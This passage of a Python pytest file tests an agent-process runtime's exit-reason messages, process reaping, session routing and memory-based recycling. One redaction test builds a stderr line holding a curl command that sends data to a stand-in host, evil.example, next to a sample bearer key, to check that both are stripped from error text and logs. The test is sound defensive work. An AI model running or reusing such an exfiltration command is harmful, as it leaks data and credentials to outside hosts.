    _neuter_kill_side_effects(monkeypatch, proc)
    proc.returncode = 1  # already exited: the status was read at mark time
    rt._stderr_lines = ["child said [returncode=<not reaped>] on its way out"]

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="reaping a dead runtime")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=1]" in summary
    assert _reap_records(caplog) == []


@pytest.mark.asyncio
async def test_kill_keeps_the_label_when_no_status_ever_arrives(caplog, monkeypatch):
    """Both waits can time out (a child wedged in uninterruptible sleep), and
    the status is then still unknown. ``<not reaped>`` must stay: nothing may
    claim a code that was never observed.

    The two waits are the POSIX ladder's, so the platform is forced to it: on
    Windows that ladder never runs, and this child is exactly the one whose
    drain raises instead of returning -- a different contract, pinned by
    ``test_an_unconfirmed_windows_drain_leaves_the_placeholder``."""
    import logging

    import kiro_crew.acp.runtime as rt_mod

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    monkeypatch.setattr(rt_mod.platform_compat, "IS_WINDOWS", False)
    # The signal delivery itself is covered by the tree-kill tests; this one is
    # about what the summary says when the reap window closes empty.
    monkeypatch.setattr(rt, "_signal_tree", AsyncMock(return_value={}))
    rt._KILL_TERM_TIMEOUT = 0.01
    rt._KILL_REAP_TIMEOUT = 0.01

    async def _never():
        await asyncio.sleep(3600)

    proc.wait = _never

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        from kiro_crew import platform_compat

        if platform_compat.IS_WINDOWS:
            # The owned-handle drain cannot confirm an exit. It preserves the
            # process for retry and reports the timeout to its caller.
            with pytest.raises(asyncio.TimeoutError):
                await rt.kill(reason="failed session setup cleanup")
        else:
            await rt.kill(reason="failed session setup cleanup")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=<not reaped>]" in summary
    assert _reap_records(caplog) == []


@pytest.mark.asyncio
async def test_death_of_a_never_spawned_runtime_says_no_process(caplog, monkeypatch):
    """No process to ask is a third answer, distinct from both a real code and
    an unreaped one — and it is the state the reported kill site was in."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    rt._process = None  # spawn never completed

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="reaping a dead shared subagent runtime before respawn")

    msg = _death_records(caplog)[0].getMessage()
    assert "returncode=<no process>" in msg
    assert "returncode=None" not in msg


@pytest.mark.asyncio
async def test_reader_crash_on_a_running_child_does_not_print_returncode_none(caplog):
    """The label is not kill-only. A reader crash or a broken pipe kills the
    RUNTIME while the child is still running, so the status is unread on those
    paths too — and the same bare ``None`` reached the log from them."""
    import logging

    rt, _, _ = _make_runtime()

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        rt._mark_dead("reader crash: boom")

    msg = _death_records(caplog)[0].getMessage()
    assert "returncode=<not reaped>" in msg
    assert "returncode=None" not in msg
    assert "returncode=None" not in (rt.death_summary() or "")


# ── process-exit reason carries the child's last stderr line ──────────────────
# A bare ``rc=1`` was all the chat error card showed when every sandboxed
# spawn started failing because the runtime tmpfs had run out of inodes. The
# reason handed to pending requests (and so to the card) now ends with what
# the child last wrote to stderr, and an ENOSPC signature earns a doctor hint.


@pytest.mark.asyncio
async def test_exit_reason_does_not_promote_the_last_stderr_line_to_a_cause():
    """A child's last word is not why it died.

    ``Error: failed to create sandbox dir`` describes no death -- it is whatever
    the child happened to flush last -- so the reason stays the exit status and
    the line is kept at debug. Pasting such a line as the cause is what puts
    ``HTTP 404 Not Found`` on the card of a death that was in fact an ordinary
    SIGTERM teardown.
    """
    rt, reader, proc = _make_runtime()
    proc.returncode = 1
    rt._stderr_lines = ["warming up", "Error: failed to create sandbox dir", "   "]
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[3] = fut
    task = await _start_reader(rt)
    try:
        reader.feed_eof()
        with pytest.raises(AcpRuntimeDead) as ei:
            await await_until(fut, what="the pending request's future")
    finally:
        await _stop_reader(task)
    msg = str(ei.value)
    assert msg == "process exited (rc=1)"
    assert "sandbox dir" not in msg
    assert "warming up" not in msg
    assert "kirocrew doctor" not in msg


def test_exit_reason_names_the_signal_that_ended_the_child():
    """A negative returncode is POSIX's ``-signum``, and the number alone is the
    part an operator has to look up -- while ``signal SIGTERM`` says plainly that
    something ASKED the process to stop, which is what the fleet's deaths were."""
    rt, _reader, _proc = _make_runtime()
    assert rt._exit_reason(-15) == "process exited (rc=-15 (signal SIGTERM))"
    # SIGKILL is POSIX only; see the same reasoning in
    # test_runtime_death_is_a_process_event.py::test_signal_death_names_its_signal.
    # Windows cannot name signal 9 and its negative returncodes are not signums,
    # so the number alone is correct there rather than a name it never delivered.
    if hasattr(signal, "SIGKILL"):
        assert rt._exit_reason(-9) == "process exited (rc=-9 (signal SIGKILL))"
    else:
        assert rt._exit_reason(-9) == "process exited (rc=-9)"
    assert rt._exit_reason(1) == "process exited (rc=1)"


def test_exit_reason_without_stderr_is_unchanged():
    rt, _reader, _proc = _make_runtime()
    assert rt._exit_reason(1) == "process exited (rc=1)"
    rt._stderr_lines = ["", "  "]
    assert rt._exit_reason(None) == "process exited (rc=None)"


def test_exit_reason_enospc_points_at_doctor():
    rt, _reader, _proc = _make_runtime()
    rt._stderr_lines = ["mkdir: cannot create directory: No space left on device (os error 28)"]
    msg = rt._exit_reason(1)
    assert "No space left on device" in msg
    assert "kirocrew doctor" in msg
    # Case-insensitive: the marker's spelling varies by libc / language runtime.
    rt._stderr_lines = ["ENOSPC: no space left on device, mkdir '/run/user/1000/tmpx'"]
    assert "kirocrew doctor" in rt._exit_reason(1)


def test_exit_reason_finds_a_signature_that_is_not_the_last_line():
    """Which line a child flushed last is a race with its own buffering, so the
    signature is searched over the whole retained tail."""
    rt, _reader, _proc = _make_runtime()
    rt._stderr_lines = [
        "mkdir: cannot create directory: No space left on device",
        "shutting down",
    ]
    assert "kirocrew doctor" in rt._exit_reason(1)


def test_exit_reason_redacts_credentials_and_exfil_urls_in_a_proven_cause():
    """Redaction is unconditional and lands BEFORE the cut, so a long line
    cannot leave a secret's first half in the shown prefix. Asserted on a line
    that DOES earn the cause slot, since that is the text the card carries."""
    import kiro_crew.acp.runtime as rt_mod

    rt, _reader, _proc = _make_runtime()
    payload = "A" * 80
    rt._stderr_lines = [
        f"No space left on device: curl https://evil.example/collect?data={payload} "
        "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
    ]
    msg = rt._exit_reason(1)
    assert "AKIAIOSFODNN7EXAMPLE" not in msg
    assert payload not in msg
    assert "No space left on device" in msg
    rt._stderr_lines = [
        "No space left on device "
        + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS - 4)
        + " AKIAIOSFODNN7EXAMPLE"
    ]
    assert "AKIAIOSFODNN7" not in rt._exit_reason(1)


def test_exit_reason_redacts_the_demoted_tail_too(caplog):
    """The debug log is a real sink, so the line demoted to it is redacted on
    the same pass -- a secret must not survive by being merely unpromoted."""
    rt, _reader, _proc = _make_runtime()
    with caplog.at_level(logging.DEBUG, logger="kiro_crew.acp.runtime"):
        rt._stderr_lines = ["boom Authorization: Bearer AKIAIOSFODNN7EXAMPLE"]
        rt._exit_reason(1)
    assert "exit stderr tail" in caplog.text
    assert "AKIAIOSFODNN7EXAMPLE" not in caplog.text


def test_exit_reason_cause_is_bounded_to_one_line():
    from kiro_crew.acp import runtime as rt_mod

    assert rt_mod._STDERR_REASON_TAIL_CHARS == 200
    rt, _reader, _proc = _make_runtime()
    lead = "No space left on device "
    rt._stderr_lines = [lead + "x" * (rt_mod._STDERR_REASON_TAIL_CHARS * 4)]
    msg = rt._exit_reason(1)
    assert "…" in msg
    assert len(msg) < rt_mod._STDERR_REASON_TAIL_CHARS + len(rt_mod._ENOSPC_HINT) + 80
    # Exactly at the cap nothing is cut.
    rt._stderr_lines = [lead.ljust(rt_mod._STDERR_REASON_TAIL_CHARS, "y")]
    assert "…" not in rt._exit_reason(1)


def test_exit_reason_enospc_hint_survives_the_tail_cap():
    """The signature is matched on the whole line and the HINT is appended after
    the cut, so a line long enough to be trimmed cannot push the operator's
    pointer out of the message that pointer is the whole purpose of."""
    from kiro_crew.acp import runtime as rt_mod

    rt, _reader, _proc = _make_runtime()
    rt._stderr_lines = ["z" * rt_mod._STDERR_REASON_TAIL_CHARS + " No space left on device"]
    msg = rt._exit_reason(1)
    assert "No space left on device" not in msg
    assert "kirocrew doctor" in msg


# ── Send paths ──


@pytest.mark.asyncio
async def test_send_request_registers_routing_and_increments_id():
    rt, _, proc = _make_runtime()
    _register(rt, "sA")
    rid = await rt.send_request("session/prompt", {"sessionId": "sA", "prompt": []})
    assert rt._routed_requests[rid] == "sA"
    # The next id advances.
    rid2 = await rt.send_request("session/prompt", {"sessionId": "sA"})
    assert rid2 != rid
    # Wire payload carries the id + method.
    sent = proc.stdin.write.call_args_list[0].args[0].decode()
    frame = json.loads(sent)
    assert frame["id"] == rid and frame["method"] == "session/prompt"
    proc.stdin.drain.assert_awaited()


@pytest.mark.asyncio
async def test_send_request_without_session_does_not_register_routing():
    rt, _, _ = _make_runtime()
    rid = await rt.send_request("initialize", {})  # no sessionId
    assert rid not in rt._routed_requests


@pytest.mark.asyncio
async def test_send_notification_has_no_id_and_no_routing():
    rt, _, proc = _make_runtime()
    _register(rt, "sA")
    before_id = rt._next_id
    await rt.send_notification("session/cancel", {"sessionId": "sA"})
    sent = proc.stdin.write.call_args_list[0].args[0].decode()
    frame = json.loads(sent)
    assert frame["method"] == "session/cancel"
    assert "id" not in frame  # notification: no id allocated
    assert rt._next_id == before_id  # id space untouched
    assert not rt._routed_requests  # nothing to leak


@pytest.mark.asyncio
async def test_send_request_on_dead_runtime_raises():
    rt, _, _ = _make_runtime()
    rt._dead = True
    with pytest.raises(AcpRuntimeDead):
        await rt.send_request("session/prompt", {"sessionId": "sA"})


# ── AcpSessionHandle behaviour ──


@pytest.mark.asyncio
async def test_handle_destroy_terminates_and_unregisters_session():
    """destroy() must evict the session on kiro-cli via _kiro.dev/session/terminate
    (freeing its transcript/context in the shared multiplexed process) AND
    unregister the local queue. A local-only unregister would leak the session
    in kiro-cli's in-memory map for the process's whole lifetime — the
    background-runtime unbounded-RSS bug this fix closes."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    rt._send_and_await = AsyncMock(return_value={})  # type: ignore[method-assign]
    handle = AcpSessionHandle("sA", q["sA"], rt)
    await handle.destroy()
    # kiro-cli was told to terminate exactly this session.
    rt._send_and_await.assert_awaited_once()
    assert rt._send_and_await.call_args.args[0] == METHOD_SESSION_TERMINATE
    assert rt._send_and_await.call_args.args[1] == {"sessionId": "sA"}
    # Local queue also unregistered.
    assert "sA" not in rt._session_queues


@pytest.mark.asyncio
async def test_terminate_session_sends_bounded_terminate_for_target_only():
    """terminate_session issues _kiro.dev/session/terminate for exactly the
    target sessionId with a bounded timeout (teardown can't stall on an
    unresponsive runtime), and unregisters ONLY that session — a co-tenant
    session on the shared runtime is untouched (unlike kill())."""
    rt, _, _ = _make_runtime()
    _register(rt, "sA", "sB")
    rt._send_and_await = AsyncMock(return_value={})  # type: ignore[method-assign]
    await rt.terminate_session("sA")
    rt._send_and_await.assert_awaited_once()
    assert rt._send_and_await.call_args.args[0] == METHOD_SESSION_TERMINATE
    assert rt._send_and_await.call_args.args[1] == {"sessionId": "sA"}
    assert rt._send_and_await.call_args.kwargs["timeout"] == _TERMINATE_TIMEOUT
    assert "sA" not in rt._session_queues
    assert "sB" in rt._session_queues  # co-tenant survives


@pytest.mark.asyncio
async def test_terminate_session_is_best_effort_when_send_fails():
    """If the terminate request fails (runtime slow/dead), teardown must NOT
    raise and MUST still unregister locally (incl. routed-request cleanup) so
    the reader stops routing to an abandoned queue."""
    rt, _, _ = _make_runtime()
    _register(rt, "sA")
    rt._routed_requests[5] = "sA"
    rt._send_and_await = AsyncMock(side_effect=AcpRuntimeError("timed out"))  # type: ignore[method-assign]
    await rt.terminate_session("sA")  # must not raise
    assert "sA" not in rt._session_queues
    assert 5 not in rt._routed_requests


@pytest.mark.asyncio
async def test_terminate_session_skips_roundtrip_when_dead():
    """A dead runtime already freed the session's memory with the process, so
    terminate skips the doomed round-trip but still unregisters locally."""
    rt, _, _ = _make_runtime()
    _register(rt, "sA")
    rt._dead = True
    rt._send_and_await = AsyncMock()  # type: ignore[method-assign]
    await rt.terminate_session("sA")
    rt._send_and_await.assert_not_awaited()
    assert "sA" not in rt._session_queues


@pytest.mark.asyncio
async def test_terminate_session_unregisters_even_on_cancellation():
    """If the terminate await is cancelled, the local unregister MUST still run.
    asyncio.CancelledError is a BaseException (not Exception in 3.9+), so it slips
    past the inner `except Exception`; the `finally` guarantees local cleanup so
    the reader loop stops routing to an abandoned queue. The cancellation itself
    still propagates (finally does not swallow it)."""
    rt, _, _ = _make_runtime()
    _register(rt, "sA")
    rt._send_and_await = AsyncMock(side_effect=asyncio.CancelledError())  # type: ignore[method-assign]
    with pytest.raises(asyncio.CancelledError):
        await rt.terminate_session("sA")
    assert "sA" not in rt._session_queues


# ── _is_stale / has_active_sessions ──


@pytest.mark.asyncio
async def test_is_stale_none_when_fresh_and_small(monkeypatch):
    """A freshly-spawned runtime is not stale; the RSS probe is skipped
    entirely because it is younger than the age band."""
    rt, _, _ = _make_runtime()
    rt._spawn_monotonic = time.monotonic()  # just spawned
    rt._max_rss_mb = 500.0
    called = {"n": 0}

    def _boom(pid):
        called["n"] += 1
        return 999999.0  # would be "stale" if ever consulted

    monkeypatch.setattr("kiro_crew.acp.runtime._get_rss_tree_mb", _boom)
    assert await rt._is_stale() is None
    assert called["n"] == 0  # young runtime never probes RSS


@pytest.mark.asyncio
async def test_is_stale_none_when_old_but_small_rss(monkeypatch):
    """Past the age band but below the RSS threshold → not stale. Exercises the
    small-RSS branch with a concrete value (not the None lookup-failure path)."""
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 6 * 3600
    rt._spawn_monotonic = time.monotonic() - 600.0  # older than the probe band
    rt._max_rss_mb = 500.0
    monkeypatch.setattr("kiro_crew.acp.runtime._get_rss_tree_mb", lambda pid, depth=None: 10.0)
    assert await rt._is_stale() is None


@pytest.mark.asyncio
async def test_is_stale_age_when_past_max_age():
    """A runtime older than _max_age_secs is stale with reason 'age'."""
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 10.0
    rt._spawn_monotonic = time.monotonic() - 20.0
    assert await rt._is_stale() == "age"


@pytest.mark.asyncio
async def test_is_stale_rss_when_tree_over_threshold(monkeypatch):
    """Past the age band and RSS tree over threshold → stale with reason 'rss'."""
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 6 * 3600
    rt._spawn_monotonic = time.monotonic() - 600.0  # old enough to probe
    rt._max_rss_mb = 100.0
    monkeypatch.setattr("kiro_crew.acp.runtime._get_rss_tree_mb", lambda pid, depth=None: 250.0)
    assert await rt._is_stale() == "rss"


@pytest.mark.asyncio
async def test_the_declared_reclaim_scope_reaches_the_probe(monkeypatch):
    """A harness that bounds its RSS scope must have that bound actually applied.

    The ceiling and the scope are one decision: applied without its scope, a
    core-only ceiling is judged against a whole-subtree measurement, which for a
    host whose subtree is dominated by a per-session fleet reads as a leak on the
    first session and recycles a healthy process. Pinned on the ARGUMENT the probe
    receives, because a policy field that is stored and never passed is exactly the
    failure that looks correct in the policy object.
    """
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 6 * 3600
    rt._spawn_monotonic = time.monotonic() - 600.0
    rt._max_rss_mb = 1024.0
    rt._max_rss_depth = 1
    seen: list[object] = []

    def _probe(pid, depth=None):
        seen.append(depth)
        return 250.0

    monkeypatch.setattr("kiro_crew.acp.runtime._get_rss_tree_mb", _probe)
    assert await rt._is_stale() is None
    assert seen == [1]


@pytest.mark.asyncio
async def test_an_unbounded_scope_is_the_default_and_is_passed_as_such(monkeypatch):
    """Every kiro-family host measures the whole subtree, and must keep doing so."""
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 6 * 3600
    rt._spawn_monotonic = time.monotonic() - 600.0
    rt._max_rss_mb = 100.0
    seen: list[object] = []

    def _probe(pid, depth=None):
        seen.append(depth)
        return 250.0

    monkeypatch.setattr("kiro_crew.acp.runtime._get_rss_tree_mb", _probe)
    assert await rt._is_stale() == "rss"
    assert seen == [None]


def test_a_forking_sandbox_backend_adds_one_generation():
    """``self._pid`` is the launcher there, not the adapter the harness counts from.

    The probe is patched in the module that CALLS it, not in ``kiro_crew.sandbox``:
    the harness binds the name at import, so patching the definition site leaves the
    real backend probe in place and the assertion reads this host instead of the case.
    """
    from kiro_crew.acp.harness.codex import _sandbox_wrapper_generations

    with patch("kiro_crew.acp.harness.codex.detect_backend", return_value="namespace"):
        assert _sandbox_wrapper_generations("standard") == 1


@pytest.mark.parametrize("backend", ["sandbox-exec", "none"])
def test_an_execing_or_absent_backend_adds_none(backend):
    """Both leave the adapter AS ``self._pid``, so a declared depth is already right."""
    from kiro_crew.acp.harness.codex import _sandbox_wrapper_generations

    with patch("kiro_crew.acp.harness.codex.detect_backend", return_value=backend):
        assert _sandbox_wrapper_generations("standard") == 0


def test_a_failed_probe_answers_zero_and_can_only_under_count():
    """Fail-safe direction: an offset too small reaches the ceiling late, never early."""
    from kiro_crew.acp.harness.codex import _sandbox_wrapper_generations

    with patch("kiro_crew.acp.harness.codex.detect_backend", side_effect=OSError("boom")):
        assert _sandbox_wrapper_generations("standard") == 0


def test_the_spawn_path_does_not_branch_on_rss_depth():
    """H13: a host-specific RSS scope adds no conditional to the shared spawn."""
    import ast
    import inspect
    import textwrap

    tree = ast.parse(textwrap.dedent(inspect.getsource(AcpRuntime._spawn_admitted)))
    for node in ast.walk(tree):
        if not isinstance(node, ast.If):
            continue
        attributes = {
            child.attr for child in ast.walk(node.test) if isinstance(child, ast.Attribute)
        }
        assert attributes.isdisjoint({"rss_depth", "_max_rss_depth"})


@pytest.mark.asyncio
async def test_a_bounded_scope_is_offset_by_the_launcher_generation(monkeypatch):
    """The bug this pins: a launcher counted as the adapter hides the growing child.

    Under a forking backend the tree is launcher -> adapter -> app-server, so a
    harness declaring "the adapter and its direct children" needs depth 2 measured
    from ``self._pid``. Applied unoffset, the sum stops at the adapter -- which is
    the FLAT process -- and the ceiling never sees the child that actually grows, so
    the leak detector reads healthy forever.
    """
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 6 * 3600
    rt._spawn_monotonic = time.monotonic() - 600.0
    rt._max_rss_mb = 1024.0
    rt._max_rss_depth = 2
    seen: list[object] = []

    def _probe(pid, depth=None):
        seen.append(depth)
        return 100.0

    monkeypatch.setattr("kiro_crew.acp.runtime._get_rss_tree_mb", _probe)
    assert await rt._is_stale() is None
    assert seen == [2]


@pytest.mark.asyncio
async def test_the_offset_does_not_touch_an_unbounded_scope(monkeypatch):
    """An extra generation at the top changes nothing when the whole subtree is summed.

    So the offset must stay out of the kiro-family answer entirely rather than being
    added and then ignored -- a None that arrives as an integer would silently bound
    a measurement nothing asked to bound.
    """
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 6 * 3600
    rt._spawn_monotonic = time.monotonic() - 600.0
    rt._max_rss_mb = 100.0
    rt._max_rss_depth = None
    seen: list[object] = []

    def _probe(pid, depth=None):
        seen.append(depth)
        return 250.0

    monkeypatch.setattr("kiro_crew.acp.runtime._get_rss_tree_mb", _probe)
    assert await rt._is_stale() == "rss"
    assert seen == [None]


@pytest.mark.asyncio
async def test_an_unreadable_bounded_measurement_does_not_recycle(monkeypatch):
    """None is "unknown, do not judge" -- the platform without a bounded walk.

    Answering with a subtree total there would apply a bounded host's ceiling to an
    unbounded measurement. Abstaining leaves the age ceiling governing, which is why
    a None must not read as a breach.
    """
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 6 * 3600
    rt._spawn_monotonic = time.monotonic() - 600.0
    rt._max_rss_mb = 1.0
    rt._max_rss_depth = 1
    monkeypatch.setattr("kiro_crew.acp.runtime._get_rss_tree_mb", lambda pid, depth=None: None)
    assert await rt._is_stale() is None


@pytest.mark.asyncio
async def test_is_stale_none_when_no_pid():
    rt, _, _ = _make_runtime()
    rt._pid = None
    assert await rt._is_stale() is None


def test_stale_by_age_cheap_check():
    rt, _, _ = _make_runtime()
    rt._max_age_secs = 10.0
    rt._spawn_monotonic = time.monotonic() - 20.0
    assert rt._stale_by_age() is True
    rt._spawn_monotonic = time.monotonic()
    assert rt._stale_by_age() is False
    rt._pid = None
    assert rt._stale_by_age() is False


def test_get_rss_mb_real_process():
    """_get_rss_mb parses a real process (this test process) and returns a
    positive MiB value; a nonexistent PID returns None. Skips where the
    platform can't introspect RSS (no /proc AND ps blocked, e.g. a locked-down
    macOS sandbox) — _get_rss_mb returns None there by design."""
    from kiro_crew.acp.runtime import _get_rss_mb

    rss = _get_rss_mb(os.getpid())
    if rss is None:
        pytest.skip("RSS introspection unavailable in this environment")
    assert rss > 0.0
    assert _get_rss_mb(2**31 - 1) is None  # nonexistent pid


def test_get_rss_tree_mb_real_process():
    """The real tree probe returns a positive sample for this process and None
    for a nonexistent PID.

    Do not compare this sample with a separate single-process RSS read: resident
    sets are live values and Windows may trim the working set between the two
    calls.  The deterministic root-plus-descendants arithmetic is covered with
    fixed values in ``test_platform_compat_coverage.py``.
    """
    from kiro_crew.acp.runtime import _get_rss_tree_mb

    tree = _get_rss_tree_mb(os.getpid())
    if tree is None:
        pytest.skip("RSS introspection unavailable in this environment")
    assert tree > 0.0
    assert _get_rss_tree_mb(2**31 - 1) is None


@pytest.mark.asyncio
async def test_has_active_sessions_false_when_empty():
    rt, _, _ = _make_runtime()
    assert rt.has_active_sessions() is False


@pytest.mark.asyncio
async def test_has_active_sessions_true_when_registered():
    rt, _, _ = _make_runtime()
    _register(rt, "sA")
    assert rt.has_active_sessions() is True


@pytest.mark.asyncio
async def test_handle_cancel_uses_notification():
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    rt.send_notification = AsyncMock()  # type: ignore[method-assign]
    handle = AcpSessionHandle("sA", q["sA"], rt)
    await handle.cancel()
    rt.send_notification.assert_awaited_once()
    assert rt.send_notification.call_args.args[0] == "session/cancel"
    assert handle._cancelled is True


@pytest.mark.asyncio
async def test_concurrent_prompt_on_same_handle_rejected():
    """A second ``prompt()`` on a handle whose turn is in flight must refuse.

    The first turn is only "in flight" once ``_run_turn`` has passed its
    ``_turn_done`` guard, and that happens AFTER two awaits the driver task has
    to get through first (``_effective_prompt_timeout_async`` and the
    ``to_thread`` prompt build). A fixed ``sleep(0.05)`` was a guess at how long
    those take; on a loaded Windows runner the guess lost, the second prompt
    passed the guard too, and then waited on a completion this test never feeds
    -- with ``timeout=None`` resolving to the multi-hour dashboard ceiling. That
    is not a failure, it is a hang: pytest-timeout kills the xdist worker, and
    with ``--max-worker-restart=0`` the whole run aborts (observed in 2 of 5
    full runs). ``_await_routed`` waits on the observable fact instead -- the
    request exists in ``_routed_requests`` -- and the second prompt carries a
    bounded timeout so a missed rejection fails at this line, loudly.
    """
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    task = await _start_reader(rt)
    try:
        # First turn is in-flight (no completion fed) -- _turn_done stays clear.
        first = asyncio.ensure_future(handle.prompt("hello").__anext__())
        await _await_routed(rt, "sA")
        assert not handle._turn_done.is_set(), "first turn must be marked active"
        # A second prompt on the same handle must refuse rather than corrupt state.
        # The bound only matters if the guard is broken: then the wait fails by
        # name instead of blocking the worker.
        with pytest.raises(AcpRuntimeError):
            await _bounded(
                handle.prompt("again", timeout=1.0).__anext__(),
                what="the second prompt's refusal",
            )
        first.cancel()
        try:
            await first
        except (asyncio.CancelledError, Exception):
            pass
    finally:
        await _stop_reader(task)


# ── Headline: one runtime, many sessions, correct routing ──


@pytest.mark.asyncio
async def test_multiple_sessions_routed_independently():
    """Two concurrent prompt turns on ONE runtime each receive only their own
    session's text chunk and completion — proving sessionId demux isolates them.
    """
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA", "sB")
    handle_a = AcpSessionHandle("sA", q["sA"], rt)
    handle_b = AcpSessionHandle("sB", q["sB"], rt)
    task = await _start_reader(rt)

    out_a: list = []
    out_b: list = []

    async def drive(handle, out):
        async for ev in handle.prompt("go", timeout=5.0):
            out.append(ev)

    da = asyncio.ensure_future(drive(handle_a, out_a))
    db = asyncio.ensure_future(drive(handle_b, out_b))
    try:
        # Let both turns issue their session/prompt requests and register routing.
        sid_to_req = await _await_routed(rt, "sA", "sB")
        assert set(sid_to_req) == {"sA", "sB"}, "both prompts must be in flight"

        # Interleave text chunks for the two sessions (out of order on purpose).
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sB",
                    "update": {"sessionUpdate": "agent_message_chunk", "text": "Bravo"},
                },
            },
        )
        _feed(
            reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "sA",
                    "update": {"sessionUpdate": "agent_message_chunk", "text": "Alpha"},
                },
            },
        )
        # Complete each turn via its own prompt response (routed by id).
        _feed(reader, {"id": sid_to_req["sA"], "result": {"stopReason": "end_turn"}})
        _feed(reader, {"id": sid_to_req["sB"], "result": {"stopReason": "end_turn"}})

        await await_until(asyncio.gather(da, db), what="every driver finishing its turn")

        text_a = "".join(e.text for e in out_a if e.kind == EVENT_TEXT_CHUNK)
        text_b = "".join(e.text for e in out_b if e.kind == EVENT_TEXT_CHUNK)
        assert text_a == "Alpha"
        assert text_b == "Bravo"
        # Cross-talk check: neither session saw the other's text.
        assert "Bravo" not in text_a
        assert "Alpha" not in text_b
        # Each turn ended with its own EVENT_COMPLETE.
        assert any(e.kind == EVENT_COMPLETE for e in out_a)
        assert any(e.kind == EVENT_COMPLETE for e in out_b)
    finally:
        for t in (da, db):
            if not t.done():
                t.cancel()
        await _stop_reader(task)


# ── AcpSessionHandle API method tests ──


@pytest.mark.asyncio
async def test_handle_session_id_property():
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    assert handle.session_id == "sA"


@pytest.mark.asyncio
async def test_handle_is_turn_active():
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    # Freshly created — no active turn
    assert handle.is_turn_active is False


@pytest.mark.asyncio
async def test_prompt_resets_turn_done_when_send_request_fails():
    """If send_request raises after _turn_done is cleared (e.g. AcpRuntimeDead on
    a broken pipe), the handle must NOT stay stuck as turn-active — otherwise
    every subsequent prompt() is permanently rejected with 'turn already active'."""
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    rt.send_request = AsyncMock(side_effect=AcpRuntimeDead("broken pipe"))

    gen = handle.prompt("hi", timeout=3.0)
    with pytest.raises(AcpRuntimeDead):
        await gen.__anext__()  # send_request fires on first iteration

    # Turn is not active, so the handle is reusable.
    assert handle.is_turn_active is False


@pytest.mark.asyncio
async def test_prompt_resets_turn_done_when_cancelled():
    """Same guard, but for cancellation — which is NOT an ``Exception``.

    ``asyncio.CancelledError`` derives from ``BaseException``, so an
    ``except Exception`` guard lets it through and leaves ``_turn_done`` cleared
    forever: ``is_turn_active`` reports True permanently and every later
    ``prompt()`` on the handle is rejected as already active. A turn timing out
    or being cancelled is routine, so this must recover.
    """
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    rt.send_request = AsyncMock(side_effect=asyncio.CancelledError())

    gen = handle.prompt("hi", timeout=3.0)
    with pytest.raises(asyncio.CancelledError):
        await gen.__anext__()

    assert handle.is_turn_active is False


@pytest.mark.asyncio
async def test_prompt_resets_turn_done_when_cancelled_while_building_blocks():
    """Cancellation at the prompt-ASSEMBLY await, not the send await.

    Image reads are offloaded with ``asyncio.to_thread``, which adds a second
    cancellation point inside the turn-state guard — and a longer-lived one,
    since it does file I/O. Cancelling there must not wedge the handle either.
    """
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    rt.send_request = AsyncMock(return_value=1)

    with patch(
        "kiro_crew.acp.session_handle.build_prompt_blocks",
        side_effect=asyncio.CancelledError(),
    ):
        gen = handle.prompt("hi", timeout=3.0)
        with pytest.raises(asyncio.CancelledError):
            await gen.__anext__()

    assert handle.is_turn_active is False


@pytest.mark.asyncio
async def test_handle_wait_turn_done_immediate():
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    # Already done — returns True immediately
    result = await handle.wait_turn_done(timeout=0.1)
    assert result is True


@pytest.mark.asyncio
async def test_handle_wait_turn_done_timeout():
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle._turn_done.clear()  # simulate active turn
    result = await handle.wait_turn_done(timeout=0.05)
    assert result is False


def _recorded_request(request_id):
    """The event the handle builds for a permission request it routes."""
    from kiro_crew.acp.types import EVENT_PERMISSION_REQUEST, AcpEvent

    return AcpEvent(kind=EVENT_PERMISSION_REQUEST, request_id=request_id, title="notes.txt")


@pytest.mark.asyncio
async def test_handle_approve_tool():
    rt, _, proc = _make_runtime()
    q = _register(rt, "sA")
    handle = AcpSessionHandle("sA", q["sA"], rt)
    handle._permission_gate_events["req-7"] = _recorded_request("req-7")
    await handle.approve_tool("req-7", option_id="allow_always")
    sent = json.loads(proc.stdin.write.call_args.args[0].decode())
    assert sent["id"] == "req-7"
    assert sent["result"]["outcome"]["outcome"] == "selected"
    assert sent["result"]["outcome"]["optionId"] == "allow_always"


@pytest.mark.asyncio
